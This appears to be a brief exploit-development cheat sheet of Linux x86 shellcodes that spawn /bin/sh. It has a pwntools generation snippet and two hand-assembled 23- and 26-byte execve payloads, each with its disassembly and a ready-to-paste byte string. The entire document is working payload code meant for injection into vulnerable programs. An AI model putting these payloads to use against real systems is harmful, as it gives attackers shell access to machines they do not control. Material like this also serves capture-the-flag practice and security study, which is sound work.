# &#35; linux x86 exec shellcodes

```bash

# 44 bytes
>>> context.clear()
>>> context.os='linux'
>>> context.arch='i386'
shellcode = asm(shellcraft.i386.linux.sh)

# 23 bytes
0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  68 2f 2f 73 68          push   0x68732f2f
8:  68 2f 62 69 6e          push   0x6e69622f
d:  89 e3                   mov    ebx,esp
f:  89 c1                   mov    ecx,eax
11: 89 c2                   mov    edx,eax
13: b0 0b                   mov    al,0xb
15: cd 80                   int    0x80
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"


# 26 bytes
0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  68 6e 2f 73 68          push   0x68732f6e
8:  68 2f 2f 62 69          push   0x69622f2f
d:  89 e3                   mov    ebx,esp
f:  31 c9                   xor    ecx,ecx
11: 31 d2                   xor    edx,edx
13: b0 08                   mov    al,0x8
15: 40                      inc    eax
16: 40                      inc    eax
17: 40                      inc    eax
18: cd 80                   int    0x80
shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"


```


